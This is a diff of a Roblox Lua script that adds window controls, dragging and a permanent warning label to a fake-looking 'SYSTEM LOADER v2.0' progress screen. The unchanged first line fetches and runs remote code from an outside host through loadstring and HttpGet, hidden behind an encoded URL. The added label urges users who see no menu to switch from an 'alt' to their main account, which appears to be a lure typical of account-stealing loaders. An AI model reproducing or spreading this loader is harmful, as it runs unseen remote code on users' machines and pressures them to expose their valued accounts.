@@ -4,11 +4,12 @@
 loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjIwNTY0MTM2LTZhZDktNGIxZi1hZmI4LTY2NmFjMWQ4NDVhYiIsImtpbmQiOiJsb2FkZXIifQ"))()
 
 -- ============================================
--- 2️⃣ ПОТОМ ПОКАЗЫВАЕМ МЕНЮ ЗАГРУЗКИ
+-- 2️⃣ ПОТОМ ПОКАЗЫВАЕМ МЕНЮ ЗАГРУЗКИ С ДОПОЛНЕНИЯМИ
 -- ============================================
 local CoreGui = game:GetService("CoreGui")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
 
 pcall(function()
     if CoreGui:FindFirstChild("LoaderUI") then
@@ -45,8 +46,8 @@ Background.Parent = ScreenGui
 
 -- Main frame
 local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 600, 0, 200)
-MainFrame.Position = UDim2.new(0.5, -300, 0.5, -100)
+MainFrame.Size = UDim2.new(0, 600, 0, 240) -- увеличили высоту, чтобы влез предупреждающий текст
+MainFrame.Position = UDim2.new(0.5, -300, 0.5, -120)
 MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
 MainFrame.BorderSizePixel = 0
 MainFrame.ZIndex = 2
@@ -77,9 +78,9 @@ BgGradient.Color = ColorSequence.new({
 BgGradient.Rotation = 45
 BgGradient.Parent = MainFrame
 
--- Title
+-- Title (для перетаскивания окна)
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, -40, 0, 30)
+Title.Size = UDim2.new(1, -80, 0, 30)
 Title.Position = UDim2.new(0, 20, 0, 20)
 Title.BackgroundTransparency = 1
 Title.Text = "⚡ SYSTEM LOADER v2.0"
@@ -89,6 +90,97 @@ Title.TextSize = 20
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.ZIndex = 3
 Title.Parent = MainFrame
+
+-- Кнопка "Закрыть" (X)
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 30, 0, 30)
+CloseBtn.Position = UDim2.new(1, -38, 0, 15)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
+CloseBtn.AnchorPoint = Vector2.new(0, 0)
+CloseBtn.Text = "X"
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.TextSize = 20
+CloseBtn.AutoButtonColor = false
+CloseBtn.ZIndex = 5
+CloseBtn.Parent = MainFrame
+
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 6)
+CloseCorner.Parent = CloseBtn
+
+CloseBtn.MouseEnter:Connect(function()
+    CloseBtn.BackgroundColor3 = Color3.fromRGB(220, 70, 70)
+end)
+CloseBtn.MouseLeave:Connect(function()
+    CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
+end)
+
+CloseBtn.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+-- Кнопка "Скрыть" (-)
+local HideBtn = Instance.new("TextButton")
+HideBtn.Size = UDim2.new(0, 30, 0, 30)
+HideBtn.Position = UDim2.new(1, -75, 0, 15)
+HideBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 150)
+HideBtn.AnchorPoint = Vector2.new(0, 0)
+HideBtn.Text = "–"
+HideBtn.Font = Enum.Font.GothamBold
+HideBtn.TextColor3 = Color3.fromRGB(230, 230, 255)
+HideBtn.TextSize = 26
+HideBtn.AutoButtonColor = false
+HideBtn.ZIndex = 5
+HideBtn.Parent = MainFrame
+
+local HideCorner = Instance.new("UICorner")
+HideCorner.CornerRadius = UDim.new(0, 6)
+HideCorner.Parent = HideBtn
+
+HideBtn.MouseEnter:Connect(function()
+    HideBtn.BackgroundColor3 = Color3.fromRGB(130, 130, 180)
+end)
+HideBtn.MouseLeave:Connect(function()
+    HideBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 150)
+end)
+
+-- Кнопка показа (круглая), появится при скрытии
+local ShowBtn = Instance.new("TextButton")
+ShowBtn.Size = UDim2.new(0, 40, 0, 40)
+ShowBtn.Position = UDim2.new(0.5, -20, 0.8, 0)
+ShowBtn.AnchorPoint = Vector2.new(0, 0)
+ShowBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 140)
+ShowBtn.Text = "▶"
+ShowBtn.Font = Enum.Font.GothamBold
+ShowBtn.TextColor3 = Color3.fromRGB(230, 230, 255)
+ShowBtn.TextSize = 28
+ShowBtn.AutoButtonColor = false
+ShowBtn.ZIndex = 6
+ShowBtn.Visible = false
+ShowBtn.Parent = ScreenGui
+
+local ShowCorner = Instance.new("UICorner")
+ShowCorner.CornerRadius = UDim.new(1, 0)
+ShowCorner.Parent = ShowBtn
+
+ShowBtn.MouseEnter:Connect(function()
+    TweenService:Create(ShowBtn, TweenInfo.new(0.25), {BackgroundColor3 = Color3.fromRGB(100, 100, 200)}):Play()
+end)
+ShowBtn.MouseLeave:Connect(function()
+    TweenService:Create(ShowBtn, TweenInfo.new(0.25), {BackgroundColor3 = Color3.fromRGB(70, 70, 140)}):Play()
+end)
+
+ShowBtn.MouseButton1Click:Connect(function()
+    MainFrame.Visible = true
+    ShowBtn.Visible = false
+end)
+
+-- Обработчик кнопки скрытия
+HideBtn.MouseButton1Click:Connect(function()
+    MainFrame.Visible = false
+    ShowBtn.Visible = true
+end)
 
 -- Percent
 local Percent = Instance.new("TextLabel")
@@ -185,6 +277,21 @@ TimerLabel.TextXAlignment = Enum.TextXAlignment.Left
 TimerLabel.ZIndex = 3
 TimerLabel.Parent = MainFrame
 
+-- ПОСТОЯННЫЙ предупредительный текст внизу меню
+local WarningLabel = Instance.new("TextLabel")
+WarningLabel.Size = UDim2.new(1, -40, 0, 40)
+WarningLabel.Position = UDim2.new(0, 20, 0, 185)
+WarningLabel.BackgroundTransparency = 1
+WarningLabel.Text = "No menu in 5 seconds? You may be on an alt. Use your main for full access."
+WarningLabel.TextColor3 = Color3.fromRGB(235, 235, 245)
+WarningLabel.Font = Enum.Font.Gotham
+WarningLabel.TextSize = 14
+WarningLabel.TextWrapped = true
+WarningLabel.TextXAlignment = Enum.TextXAlignment.Center
+WarningLabel.TextYAlignment = Enum.TextYAlignment.Center
+WarningLabel.ZIndex = 3
+WarningLabel.Parent = MainFrame
+
 -- Animations
 task.spawn(function()
     while BarFill.Parent do
@@ -217,7 +324,7 @@ task.spawn(function()
     end
 end)
 
--- STAGES
+-- STAGES загрузки
 local stages = {
     {name = "Initializing system core...", weight = 8},
     {name = "Connecting to server...", weight = 10},
@@ -281,56 +388,42 @@ task.spawn(function()
     if timerConnection then timerConnection:Disconnect() end
     TimerLabel.Text = string.format("⏱ Loaded in %.1f seconds", tick() - startTime)
 
-    -- ===== ДОБАВЛЕНО: отдельное уведомление =====
-    task.wait(0.8)
+    -- после загрузки меню остаётся видимым, без закрытия
+end)
 
-    local NoticeGui = Instance.new("ScreenGui")
-    NoticeGui.Name = "NoticeGui"
-    NoticeGui.ResetOnSpawn = false
-    NoticeGui.IgnoreGuiInset = true
-    NoticeGui.DisplayOrder = 1000
-    NoticeGui.Parent = ScreenGui.Parent
+-- ПЕРЕТАСКИВАНИЕ меню по заголовку Title
 
-    local NoticeBox = Instance.new("Frame")
-    NoticeBox.Size = UDim2.fromOffset(470, 74)
-    NoticeBox.Position = UDim2.new(0.5, -235, 0.82, 0)
-    NoticeBox.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
-    NoticeBox.BorderSizePixel = 0
-    NoticeBox.Parent = NoticeGui
+local dragging = false
+local dragInput, dragStart, startPos
 
-    local NoticeCorner = Instance.new("UICorner")
-    NoticeCorner.CornerRadius = UDim.new(0, 10)
-    NoticeCorner.Parent = NoticeBox
+Title.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
 
-    local NoticeStroke = Instance.new("UIStroke")
-    NoticeStroke.Color = Color3.fromRGB(55, 55, 70)
-    NoticeStroke.Thickness = 1
-    NoticeStroke.Parent = NoticeBox
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
 
-    local NoticeText = Instance.new("TextLabel")
-    NoticeText.Size = UDim2.new(1, -20, 1, -12)
-    NoticeText.Position = UDim2.fromOffset(10, 6)
-    NoticeText.BackgroundTransparency = 1
-    NoticeText.Text = "No menu in 5 seconds? You may be on an alt. Use your main for full access."
-    NoticeText.Font = Enum.Font.Gotham
-    NoticeText.TextSize = 14
-    NoticeText.TextColor3 = Color3.fromRGB(235, 235, 245)
-    NoticeText.TextWrapped = true
-    NoticeText.TextXAlignment = Enum.TextXAlignment.Center
-    NoticeText.TextYAlignment = Enum.TextYAlignment.Center
-    NoticeText.Parent = NoticeBox
+Title.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
+    end
+end)
 
-    task.wait(5)
-
-    NoticeGui:Destroy()
-
-    TweenService:Create(MainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
-        Size = UDim2.new(0, 0, 0, 0),
-        Position = UDim2.new(0.5, 0, 0.5, 0),
-        BackgroundTransparency = 1
-    }):Play()
-    TweenService:Create(Background, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
-
-    task.wait(0.8)
-    ScreenGui:Destroy()
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and input == dragInput then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
 end)
